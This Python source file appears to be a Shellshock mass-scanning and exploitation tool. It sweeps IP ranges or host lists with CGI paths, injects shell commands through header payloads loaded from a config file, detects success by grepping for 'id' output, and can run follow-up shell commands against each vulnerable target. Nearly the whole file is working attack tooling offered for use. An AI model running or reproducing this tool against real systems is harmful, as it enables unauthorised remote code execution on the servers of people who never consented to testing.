#!/usr/bin/python
# coding: utf-8
__author__ = "Cleiton Pinheiro aka Mr. Cl0wn"
__credits__ = ["Cleiton Pinheiro"]
__license__ = "GPL"
__version__ = "0.1"
__maintainer__ = "Cleiton Pinheiro aka Mr. Cl0wn"
__email__ = "mrcl0wnlab@gmail.com"
__git__ = "https://github.com/MrCl0wnLab"
__twitter__ = "https://twitter.com/MrCl0wnLab"

from modules.debug_shock import DebugShock
import re
import ssl
import time
import urllib3
import argparse
import os
import subprocess
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

from modules.file_shock import FileLocal
from modules.request_shock import RequestShock
from modules.thread_shock import ThreadShock
from modules.color_shock import  ColorShock
from modules.banner_shock import  BannerShock

def cs(_color_str:str):
    return OBJ_ColorShock.get(_color_str)

def grep_uid(_html:str):
    if _html:
        return re.findall(CHECKER_RESULT_REGEX,_html)

def banner():
    print(cs('orange'),
    OBJ_Banner,
    cs('end'))

def ipRange(_start_ip, _end_ip):
    start = list(map(int, _start_ip.split(".")))
    end = list(map(int, _end_ip.split(".")))
    temp = start
    ip_range = []
    ip_range.append(_start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i-1] += 1
        ip_range.append(".".join(map(str, temp)))
    return ip_range

def get_taget_list():
    target_list = []
    target_cgi_list = []
    if TARGET_RANGE_STR:
        ip_range = TARGET_RANGE_STR.split(",")
        ip_range_list = ipRange(ip_range[0],ip_range[1])
        if ip_range_list:
            target_list.extend(ip_range_list)

    if FILE_TARGET_STR:
        print(FILE_TARGET_STR)
        file_target = OBJ_FileLocal.open_get_lines(FILE_TARGET_STR)
        file_target = [target_clear.replace("\n",'') for target_clear in file_target]
        if file_target:
            target_list.extend(file_target)

    for target_str in target_list:
        target_cgi_list.extend(add_pwd_cgi(target_str))

    return set(target_cgi_list)

def replace_magic_string(_value:str,_exploit:str):
    _value = _exploit.replace('_COMMAND_',_value).replace("\n","")
    _value = _value.replace('_CHECKER_',CHECKER_RESULT_STR)
    return _value
    
def add_pwd_cgi(target:str):
    if target:
        target_cgi_list = []
        for cgi_str in FILE_CGI_LIST:
            target_cgi_list.append(target + cgi_str.replace("\n",'').strip())
        return target_cgi_list

def process():
    try: 
        target_list = get_taget_list()
        # PRINT INFOS
        time_str = get_time_now()
        print(cs('white2'),time_str,FIRULA_INF,'Range:',TARGET_RANGE_STR,cs('end'))
        print(cs('white2'),time_str,FIRULA_INF,'File CGI:',FILE_NAME_CGI,cs('end'))
        print(cs('white2'),time_str,FIRULA_INF,'File Exploits:',CONFIG_FILE_EXPLOIT,cs('end'))
        print(cs('white2'),time_str,FIRULA_INF,'Total Generated:',len(target_list),cs('end'))
        print(cs('white2'),time_str,FIRULA_INF,'Total Files CGI:',len(FILE_CGI_LIST),cs('end'))
        print(cs('white2'),time_str,FIRULA_INF,'Inject Command:',COMMAND_SHELL_STR,cs('end'))
        print(cs('white2'),time_str,FIRULA_INF,'Template ShellShock:',HEADER_COMMAND_DICT,cs('end'))
        print(cs('white2'),time_str,FIRULA_INF,'Test all Payloads:',TEST_ALL_PAYLOADS,cs('end'))
        print(cs('white2'),time_str,FIRULA_INF,'Command Exec on Vuln:',COMMAND_EXEC_SHELL_STR,cs('end'))
        print(cs('white2'),time_str,FIRULA_INF,'Checker Default:',CHECKER,cs('end'),"\n")
        
        cmd_exec = COMMAND_SHELL_STR if COMMAND_SHELL_STR else CHECKER_COMMAND_STR
        OBJ_ThreadShock.exec_thread(exploit,cmd_exec,target_list,None)
    except:
        pass

def process_print(_color1,_date_time,_firula,_target,_color2,_command,_color3,_grep,_color4,_code,_time_final,_color5):
    print(
        cs(_color1),_date_time,_firula,_target,
        cs(_color2),'COMMAND:',_command,
        cs(_color3),'RESULT:',_grep,
        cs(_color4),'CODE:',_code,_time_final,
        cs(_color5)
    )

def get_time_now():
    return str("[ {} ]".format(datetime.now().strftime("%X")))

def exec_exploit(_target, _command,_exploit:list):
    try:

        if _target and _command:
            result = None
            command = replace_magic_string(_command,_exploit[1])
            target_url,result,code_http,time_final = OBJ_RequestShock.send_request(_target, command)
            grep_uid_str = grep_uid(result)
            time_str = get_time_now()

            if code_http:
                OBJ_FileLocal.save_result(f"{target_url}, {_exploit[0]}, {command}\n",f'output/{code_http}.txt')
            
            if (CHECKER and grep_uid_str) or grep_uid_str or (CHECKER_RESULT_STR in result):
                process_print(
                    'pink',time_str,FIRULA_OK,target_url,
                    'cyan',_exploit[0],
                    'green',grep_uid_str,
                    'light_green',code_http,time_final,
                    'end'
                )
                exec_command_shell(target_url)
                OBJ_FileLocal.save_result(f"{target_url}, {_exploit[0]}, {CHECKER_COMMAND_STR}, {result}\n",'output/vuln.txt')
                return

            if COMMAND_SHELL_STR and (code_http == 200 or code_http ==  301 or code_http ==  302) :
                process_print(
                    'yellow',time_str,FIRULA_EXEC,target_url,
                    'cyan',_exploit[0],
                    'green',result,
                    'light_green',code_http,time_final,
                    'end',
                )
                return

            process_print(
                'red',time_str,FIRULA_ERR,target_url,
                'light_red',_exploit[0],
                'dark_grey',result,
                'red',code_http,time_final,
                'end'
            )
    except:
        pass

def exploit(_target: str, _command: str,_mix):
    try:
        if TEST_ALL_PAYLOADS:
            for key in SHELLSHOCK_EXPLOIT_LIST:
                _exploit = SHELLSHOCK_EXPLOIT_LIST.get(key)
                try:
                    OBJ_ThreadShock.main_pool_thread(exec_exploit,_target,_command,[key,_exploit])
                except Exception as err:
                    print(err)
                    pass
            return
        OBJ_ThreadShock.main_pool_thread(exec_exploit,_target,_command,HEADER_COMMAND_DICT)
    except Exception as err:
        print(err)
        pass

def load_json(file_str:str):
    return OBJ_FileLocal.open_file_json(file_str)

def exec_command_shell(_target:str):
    cmd = COMMAND_EXEC_SHELL_STR.replace('_TARGET_',_target)
    if cmd:
        try:
            print(cs('blue'),get_time_now(),f'[ TARGET ][ {_target} ]')
            print(cs('blue'),get_time_now(),f'[ COMMAND ][ {cmd} ]')
            print(cs('blue'),get_time_now(),'[ CMD ][ START ]')
            process = subprocess.run(cmd, shell=True,capture_output=True,  universal_newlines=True)
            print(cs('light_blue'))
            print(process.stdout,cs('end'))
            print(cs('blue'),get_time_now(),'[ CMD ][ END ]')
        except Exception as err:
            print(err)
            pass

if __name__ == '__main__':
    
    OBJ_FileLocal = FileLocal()
    OBJ_ThreadShock = ThreadShock()
    OBJ_RequestShock = RequestShock()
    OBJ_ColorShock = dict(ColorShock())
    OBJ_Banner = BannerShock()
    OBJ_Debug = DebugShock()


   
    ASSETS_STR = 'assets/'
    CONFIG_JSON = load_json(ASSETS_STR+'config.json')

    CONFIG_PATH_WORDLIST = CONFIG_JSON['config']['path']['path_wordlist']
    CONFIG_FILE_EXPLOIT = CONFIG_JSON['config']['files_assets']['exploits']
    CONFIG_THREAD = int(CONFIG_JSON['config']['threads'])

    CHECKER_COMMAND_STR = "id"
    CHECKER_RESULT_STR = 'mrcl0w'
    CHECKER_RESULT_REGEX = r'(uid=[0-9]+.*gr[u|o].*p?=[0-9]+[^ ]+)'

    SHELLSHOCK_EXPLOIT_LIST =  load_json(CONFIG_FILE_EXPLOIT)
    HEADER_COMMAND_DICT = ['DEFAULT',SHELLSHOCK_EXPLOIT_LIST.get('DEFAULT')]

    FIRULA_EXEC = '[ EXC ]'
    FIRULA_INF = '[ INF ]'
    FIRULA_OK = '[ VUN ]'
    FIRULA_ERR = '[ ERR ]'

    parser = argparse.ArgumentParser(
        prog='tool', 
        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=40)
    )
    
    banner()

    parser.add_argument('--file', help='Input your target host lists',metavar='<ips.txt>',  required=False)
    parser.add_argument('--range', help='Set range IP Eg.: 192.168.15.1,192.168.15.100',  metavar='<ip-start>,<ip-end>', required=False)
    parser.add_argument('--cmd-cgi', help='Define shell command that will be executed in the payload ',default=None, metavar='<command shell>', required=False)
    parser.add_argument('--exec-vuln', help='Executing commands on vulnerable targets',default=None, metavar='<command shell>', required=False)
    parser.add_argument('--thread','-t', help='Eg. 20',metavar='<20>', default=CONFIG_THREAD, required=False)
    parser.add_argument('--check', help='Check for shellshock vulnerability',action='store_true', default=False)
    parser.add_argument('--ssl', help='Enable request with SSL ',action='store_true', default=False)
    parser.add_argument('--cgi-file', help='Defines a CGI file to be used ',default=CONFIG_PATH_WORDLIST+'cgi.txt', metavar='<cgi.txt>', required=False)
    parser.add_argument('--timeout', help='Set connection timeout',default=5, metavar='<5>', required=False)
    parser.add_argument('--all', help='Teste all payloads',action='store_true', default=False)
    parser.add_argument('--debug','-d', help='Enable debug mode ',action='store_true', default=False)

    arg_menu = parser.parse_args()

    if not (arg_menu.file or arg_menu.range):
        exit(parser.print_help())

    if  arg_menu.debug:
        OBJ_Debug.debug()

    FILE_TARGET_STR = arg_menu.file
    FILE_NAME_CGI = arg_menu.cgi_file
    TARGET_RANGE_STR = arg_menu.range
    COMMAND_SHELL_STR = arg_menu.cmd_cgi
    COMMAND_EXEC_SHELL_STR = arg_menu.exec_vuln

    CHECKER  = arg_menu.check
    FORCE_HTTPS = arg_menu.ssl
    TEST_ALL_PAYLOADS = arg_menu.all
    MAX_CONECTION_THREAD = int(arg_menu.thread)
    TIMEOUT_REQUEST = int(arg_menu.timeout)

    FILE_CGI_LIST = OBJ_FileLocal.open_get_lines(FILE_NAME_CGI)
    OBJ_RequestShock.protocol = 'https' if FORCE_HTTPS else 'https'

    
    process()

   


